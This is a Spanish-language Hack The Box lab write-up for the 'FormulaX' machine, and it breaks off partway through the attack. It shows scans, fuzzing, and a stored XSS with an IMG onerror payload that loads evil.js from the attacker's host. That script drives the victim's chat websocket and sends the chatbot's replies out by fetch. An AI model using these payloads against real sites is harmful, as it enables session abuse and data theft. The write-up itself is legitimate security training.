@@ -1,0 +1,577 @@
+<!doctype html>
+<html lang="es-ES"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <title>Bajo el teclado</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="" />
+
+    
+    
+    
+    <link rel="stylesheet" href="../../css/theme.min.css">
+
+    
+    
+    
+
+    
+  
+
+
+</head>
+<body>
+        <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
+    <div class="row">
+        
+        <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
+            <a href="../../" class="text-decoration-none">
+                <img id="home-image" class="rounded-circle"
+                    
+                        
+                            src="../../pointed.png"
+                        
+                    
+                />
+            </a>
+        </div>
+        <div class="col-sm-8 col-12 text-sm-left text-center">
+        
+            <h2 class="m-0 mb-2 mt-4">
+                <a href="../../" class="text-decoration-none">
+                    
+                        pointedsec
+                    
+                </a>
+            </h2>
+            <p class="text-muted mb-1">
+                
+                    if pentester.found == bug { make(pentester,states.happy) }
+                
+            </p>
+            <ul id="nav-links" class="list-inline mb-2">
+                
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../" title="Home">/Home</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../about/" title="About">About</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../writeups/" title="Write-Up&#39;s">Write-Up&#39;s</a>
+                    </li>
+                
+            </ul>
+            <ul id="nav-social" class="list-inline">
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="http://github.com/pointedsec" target="_blank">
+                            <i class="fab fa-github fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://www.linkedin.com/in/andr%C3%A9s-del-cerro-rodr%C3%ADguez-13a826293/" target="_blank">
+                            <i class="fab fa-linkedin-in fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="mailto:adelcerrorodriguez@gmail.com" target="_blank">
+                            <i class="fas fa-at fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://pointedsec.vercel.app" target="_blank">
+                            <i class="fas fa-globe fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://app.hackthebox.com/profile/1575364" target="_blank">
+                            <i class="fas fa-box fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+    <hr />
+</header>
+<div class="container">
+    <div class="pl-sm-4 ml-sm-5">
+        <h1 id="hack-the-box-formulax-writeup">Hack The Box: FormulaX Writeup</h1>
+<h1 id="tcp-enumeration">TCP Enumeration</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ rustscan -a 10.129.230.190 --ulimit <span style="color:#ae81ff">5000</span> -g
+</span></span><span style="display:flex;"><span>10.129.230.190 -&gt; <span style="color:#f92672">[</span>22,80<span style="color:#f92672">]</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -p22,80 -sCV 10.129.230.190 -Pn -oN allPorts
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-07-31 18:19 CEST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.230.190
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.038s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 5f:b2:cd:54:e4:47:d1:0e:9e:81:35:92:3c:d6:a3:cb <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> b9:f0:0d:dc:05:7b:fa:fb:91:e6:d0:b4:59:e6:db:88 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html; charset<span style="color:#f92672">=</span>UTF-8<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>|_Requested resource was /static/index.html
+</span></span><span style="display:flex;"><span>|_http-cors: GET POST
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 7.93 seconds
+</span></span></code></pre></div><h1 id="udp-enumeration">UDP Enumeration</h1>
+<p>No vemos nada abierto por UDP</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo nmap --top-ports <span style="color:#ae81ff">1500</span> 10.129.230.190 --min-rate <span style="color:#ae81ff">5000</span> -n -Pn -sU -oN allPorts.UDP
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-07-31 18:20 CEST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.230.190
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.037s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">1494</span> open|filtered udp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE  SERVICE
+</span></span><span style="display:flex;"><span>19998/udp closed unknown
+</span></span><span style="display:flex;"><span>30465/udp closed unknown
+</span></span><span style="display:flex;"><span>34861/udp closed unknown
+</span></span><span style="display:flex;"><span>42508/udp closed candp
+</span></span><span style="display:flex;"><span>49163/udp closed unknown
+</span></span><span style="display:flex;"><span>49207/udp closed unknown
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 0.81 seconds
+</span></span></code></pre></div><h1 id="web-enumeration">Web Enumeration</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ whatweb http://10.129.230.190
+</span></span><span style="display:flex;"><span>http://10.129.230.190 <span style="color:#f92672">[</span><span style="color:#ae81ff">302</span> Found<span style="color:#f92672">]</span> Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTTPServer<span style="color:#f92672">[</span>Ubuntu Linux<span style="color:#f92672">][</span>nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)]</span>, IP<span style="color:#f92672">[</span>10.129.230.190<span style="color:#f92672">]</span>, RedirectLocation<span style="color:#f92672">[</span>/static/index.html<span style="color:#f92672">]</span>, UncommonHeaders<span style="color:#f92672">[</span>access-control-allow-origin,access-control-allow-credentials<span style="color:#f92672">]</span>, X-Powered-By<span style="color:#f92672">[</span>Express<span style="color:#f92672">]</span>, nginx<span style="color:#f92672">[</span>1.18.0<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>http://10.129.230.190/static/index.html <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTML5, HTTPServer<span style="color:#f92672">[</span>Ubuntu Linux<span style="color:#f92672">][</span>nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)]</span>, IP<span style="color:#f92672">[</span>10.129.230.190<span style="color:#f92672">]</span>, PasswordField<span style="color:#f92672">[</span>psw<span style="color:#f92672">]</span>, Script, UncommonHeaders<span style="color:#f92672">[</span>access-control-allow-origin,access-control-allow-credentials<span style="color:#f92672">]</span>, X-Powered-By<span style="color:#f92672">[</span>Express<span style="color:#f92672">]</span>, nginx<span style="color:#f92672">[</span>1.18.0<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Vemos un panel de inicio de sesión.
+<img src="images/Screenshot_1.png" alt="Write-up Image"></p>
+<p>Después de hacernos una cuenta de usuario, podemos ver que este servicio web ofrece una especie de chatbot.
+<img src="images/Screenshot_2.png" alt="Write-up Image"></p>
+<p>Si nos damos cuenta, esta es una página estática en <code>html</code> por lo cual por detrás se debe de estar empleando javascript para la comunicación con algún servidor.
+<img src="images/Screenshot_3.png" alt="Write-up Image">
+Y podemos comprobar el uso de websockets.</p>
+<p>En el apartado de <code>Contact Us</code> , haciendo unas pruebas podemos ver que se acontece un XSS.
+<img src="images/Screenshot_4.png" alt="Write-up Image"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span> python3 -m http.server <span style="color:#ae81ff">8080</span>
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8080</span> <span style="color:#f92672">(</span>http://0.0.0.0:8080/<span style="color:#f92672">)</span> ...
+</span></span><span style="display:flex;"><span>10.129.230.190 - - <span style="color:#f92672">[</span>31/Jul/2024 18:24:55<span style="color:#f92672">]</span> code 404, message File not found
+</span></span><span style="display:flex;"><span>10.129.230.190 - - <span style="color:#f92672">[</span>31/Jul/2024 18:24:55<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /img.png HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> -
+</span></span><span style="display:flex;"><span>10.129.230.190 - - <span style="color:#f92672">[</span>31/Jul/2024 18:24:59<span style="color:#f92672">]</span> code 404, message File not found
+</span></span><span style="display:flex;"><span>10.129.230.190 - - <span style="color:#f92672">[</span>31/Jul/2024 18:24:59<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /img.png HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> -
+</span></span><span style="display:flex;"><span>10.129.230.190 - - <span style="color:#f92672">[</span>31/Jul/2024 18:25:01<span style="color:#f92672">]</span> code 404, message File not found
+</span></span><span style="display:flex;"><span>10.129.230.190 - - <span style="color:#f92672">[</span>31/Jul/2024 18:25:01<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /img.png HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> -
+</span></span><span style="display:flex;"><span>10.129.230.190 - - <span style="color:#f92672">[</span>31/Jul/2024 18:25:06<span style="color:#f92672">]</span> code 404, message File not found
+</span></span><span style="display:flex;"><span>10.129.230.190 - - <span style="color:#f92672">[</span>31/Jul/2024 18:25:06<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /img.png HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> -
+</span></span><span style="display:flex;"><span>10.129.230.190 - - <span style="color:#f92672">[</span>31/Jul/2024 18:25:08<span style="color:#f92672">]</span> code 404, message File not found
+</span></span><span style="display:flex;"><span>10.129.230.190 - - <span style="color:#f92672">[</span>31/Jul/2024 18:25:08<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /img.png HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> -
+</span></span></code></pre></div><p>No podemos hacer un Cookie hijacking ya que está activado el <code>HttpOnly</code>
+<img src="images/Screenshot_5.png" alt="Write-up Image"></p>
+<p>Después de investigar un rato, me dió por fuzzear el sitio web ya que todavía no lo había hecho.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ feroxbuster -u http://10.129.230.190 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt 
+</span></span><span style="display:flex;"><span>                                                                                          
+</span></span><span style="display:flex;"><span> ___  ___  __   __     __      __         __   ___
+</span></span><span style="display:flex;"><span>|__  |__  |__<span style="color:#f92672">)</span> |__<span style="color:#f92672">)</span> | /  <span style="color:#e6db74">`</span>    /  <span style="color:#ae81ff">\ \_</span>/ | |  <span style="color:#ae81ff">\ </span>|__
+</span></span><span style="display:flex;"><span>|    |___ |  <span style="color:#ae81ff">\ </span>|  <span style="color:#ae81ff">\ </span>| <span style="color:#ae81ff">\_</span>_,    <span style="color:#ae81ff">\_</span>_/ / <span style="color:#ae81ff">\ </span>| |__/ |___
+</span></span><span style="display:flex;"><span>by Ben <span style="color:#e6db74">&#34;epi&#34;</span> Risher 🤓                 ver: 2.10.4
+</span></span><span style="display:flex;"><span>───────────────────────────┬──────────────────────
+</span></span><span style="display:flex;"><span> 🎯  Target Url            │ http://10.129.230.190
+</span></span><span style="display:flex;"><span> 🚀  Threads               │ <span style="color:#ae81ff">50</span>
+</span></span><span style="display:flex;"><span> 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span> 👌  Status Codes          │ All Status Codes!
+</span></span><span style="display:flex;"><span> 💥  Timeout <span style="color:#f92672">(</span>secs<span style="color:#f92672">)</span>        │ <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span> 🦡  User-Agent            │ feroxbuster/2.10.4
+</span></span><span style="display:flex;"><span> 🔎  Extract Links         │ true
+</span></span><span style="display:flex;"><span> 🏁  HTTP methods          │ <span style="color:#f92672">[</span>GET<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> 🔃  Recursion Depth       │ <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>───────────────────────────┴──────────────────────
+</span></span><span style="display:flex;"><span> 🏁  Press <span style="color:#f92672">[</span>ENTER<span style="color:#f92672">]</span> to use the Scan Management Menu™
+</span></span><span style="display:flex;"><span>──────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">404</span>      GET       10l       15w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">302</span>      GET        1l        4w       40c http://10.129.230.190/ <span style="color:#f92672">=</span>&gt; http://10.129.230.190/static/index.html
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">301</span>      GET       10l       16w      173c http://10.129.230.190/img <span style="color:#f92672">=</span>&gt; http://10.129.230.190/img/
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span>      GET        1l        3w       46c http://10.129.230.190/contact_us
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span>      GET        1l        3w       46c http://10.129.230.190/admin
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">301</span>      GET       10l       16w      179c http://10.129.230.190/static <span style="color:#f92672">=</span>&gt; http://10.129.230.190/static/
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">301</span>      GET       10l       16w      181c http://10.129.230.190/scripts <span style="color:#f92672">=</span>&gt; http://10.129.230.190/scripts/
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span>      GET        1l        3w       46c http://10.129.230.190/chat
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span>      GET        1l        3w       46c http://10.129.230.190/logout
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span>      GET        1l        3w       46c http://10.129.230.190/Contact_Us
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">301</span>      GET       10l       16w      181c http://10.129.230.190/Scripts <span style="color:#f92672">=</span>&gt; http://10.129.230.190/Scripts/
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span>      GET        1l        3w       46c http://10.129.230.190/Chat
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">301</span>      GET       10l       16w      187c http://10.129.230.190/restricted <span style="color:#f92672">=</span>&gt; http://10.129.230.190/restricted/
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span>      GET        1l        3w       46c http://10.129.230.190/Admin
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>&gt;-------------------<span style="color:#f92672">]</span> - 49s    35083/1323280 35m     found:13      errors:0
+</span></span></code></pre></div><h1 id="information-leakage-via-xss">Information Leakage via XSS</h1>
+<p>Y al ver el directorio <code>Scripts</code> recordé el chatbot que existía y el comando <code>help</code> que este tiene para recuperar el historial de comandos. Quizá puedo aprovecharme del XSS para inyectar una comunicación entre el chatbot y el usuario víctima para recuperar su historial y obtener información privilegiada.</p>
+<p>Localicé que el script <code>socket.io.js</code> en <code>http://10.129.230.190/socket.io/socket.io.js</code></p>
+<p>Por lo cual podría simplemente inyectar este script y realizar la comunicación. Pero antes, tengo que ver como se realiza la comunicación desde el cliente.</p>
+<p>Encontramos el script <code>chat.js</code>
+<code>http://10.129.230.190/restricted/chat.js</code></p>
+<p>Y vemos este apartado</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">value</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">res</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">axios</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">`/user/api/chat`</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">socket</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">io</span>(<span style="color:#e6db74">&#39;/&#39;</span>,{<span style="color:#a6e22e">withCredentials</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//listening for the messages
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">socket</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;message&#39;</span>, (<span style="color:#a6e22e">my_message</span>) =&gt; {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">//console.log(&#34;Received From Server: &#34; + my_message)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">Show_messages_on_screen_of_Server</span>(<span style="color:#a6e22e">my_message</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>})
+</span></span></code></pre></div><p>Esto lo hago para hacerme una idea ya que no había trabajado con websockets antes.</p>
+<p>Ahora, tengo que refinar el XSS para poder cargar un archivo javascript malicioso, por ahora este va a ser el archivo.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat evil.js 
+</span></span><span style="display:flex;"><span>fetch<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;http://10.10.14.71:8081/injected&#34;</span><span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Después de hacer unas pruebas en local..</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 -m http.server <span style="color:#ae81ff">8081</span>
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8081</span> <span style="color:#f92672">(</span>http://0.0.0.0:8081/<span style="color:#f92672">)</span> ...
+</span></span><span style="display:flex;"><span>127.0.0.1 - - <span style="color:#f92672">[</span>31/Jul/2024 18:46:37<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /test.html HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
+</span></span><span style="display:flex;"><span>127.0.0.1 - - <span style="color:#f92672">[</span>31/Jul/2024 18:46:37<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET / HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
+</span></span><span style="display:flex;"><span>127.0.0.1 - - <span style="color:#f92672">[</span>31/Jul/2024 18:46:37<span style="color:#f92672">]</span> code 404, message File not found
+</span></span><span style="display:flex;"><span>127.0.0.1 - - <span style="color:#f92672">[</span>31/Jul/2024 18:46:37<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /favicon.ico HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> -
+</span></span><span style="display:flex;"><span>10.10.14.71 - - <span style="color:#f92672">[</span>31/Jul/2024 18:46:37<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /evil.js HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
+</span></span></code></pre></div><p>Este es mi payload final</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>└──╼ [★]$ cat test.html 
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">IMG</span> <span style="color:#a6e22e">SRC</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  var script = document.createElement(&#39;script&#39;);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  script.src = &#39;http://10.10.14.71:8081/evil.js&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  document.head.appendChild(script);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>&gt;
+</span></span></code></pre></div><p>Y perfecto, ahora solo falta hacer el código javascript malicioso.
+<img src="images/Screenshot_6.png" alt="Write-up Image"></p>
+<p>Podemos interceptar una petición de mensaje con <code>burpsuite</code> para hacernos una mejor idea de como se tramita el mensaje por detrás.
+<img src="images/Screenshot_7.png" alt="Write-up Image"></p>
+<p>Después de probar un rato&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 -m http.server <span style="color:#ae81ff">8081</span>
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8081</span> <span style="color:#f92672">(</span>http://0.0.0.0:8081/<span style="color:#f92672">)</span> ...
+</span></span><span style="display:flex;"><span>10.129.230.190 - - <span style="color:#f92672">[</span>31/Jul/2024 19:18:34<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /evil.js HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
+</span></span><span style="display:flex;"><span>10.129.230.190 - - <span style="color:#f92672">[</span>31/Jul/2024 19:18:34<span style="color:#f92672">]</span> code 501, message Unsupported method <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;OPTIONS&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>10.129.230.190 - - <span style="color:#f92672">[</span>31/Jul/2024 19:18:34<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;OPTIONS /injected HTTP/1.1&#34;</span> <span style="color:#ae81ff">501</span> -
+</span></span><span style="display:flex;"><span>10.129.230.190 - - <span style="color:#f92672">[</span>31/Jul/2024 19:18:34<span style="color:#f92672">]</span> code 501, message Unsupported method <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;OPTIONS&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>10.129.230.190 - - <span style="color:#f92672">[</span>31/Jul/2024 19:18:34<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;OPTIONS /loadedd HTTP/1.1&#34;</span> <span style="color:#ae81ff">501</span> -
+</span></span><span style="display:flex;"><span>10.129.230.190 - - <span style="color:#f92672">[</span>31/Jul/2024 19:18:34<span style="color:#f92672">]</span> code 501, message Unsupported method <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;OPTIONS&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>10.129.230.190 - - <span style="color:#f92672">[</span>31/Jul/2024 19:18:34<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;OPTIONS /?q=Greetings!.%20How%20can%20i%20help%20you%20today%20?.%20You%20can%20type%20help%20to%20see%20some%20buildin%20commands HTTP/1.1&#34;</span> <span style="color:#ae81ff">501</span> -
+</span></span></code></pre></div><p>Este es el archivo <code>evil.js</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">$</span> <span style="color:#a6e22e">cat</span> <span style="color:#a6e22e">evil</span>.<span style="color:#a6e22e">js</span> 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;http://10.10.14.71:8081/injected&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Incluimos el socket.io.js ya que en principio no está incluido.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">script</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#34;script&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">script</span>.<span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://10.129.230.190/socket.io/socket.io.js&#34;</span>
+</span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">head</span>.<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">script</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Esperamos a que carge el script......
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">script</span>.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;load&#39;</span>, <span style="color:#66d9ef">function</span>() {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;http://10.10.14.71:8081/loadedd&#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">res</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;/user/api/chat&#39;</span>); <span style="color:#75715e">// No se si está la libreria de axios inyectada ya
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">socket</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">io</span>(<span style="color:#e6db74">&#39;/&#39;</span>,{<span style="color:#a6e22e">withCredentials</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>});
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">socket</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;message&#39;</span>, (<span style="color:#a6e22e">msg</span>) =&gt; {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;http://10.10.14.71:8081/?q=&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">msg</span>)
+</span></span><span style="display:flex;"><span>	});
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">socket</span>.<span style="color:#a6e22e">emit</span>(<span style="color:#e6db74">&#39;client_message&#39;</span>, <span style="color:#e6db74">&#39;help&#39;</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>Vamos a hacer un par de retoques finales, primero vamos a codificar en base64 la respuesta para poder verla mas cómoda.</p>
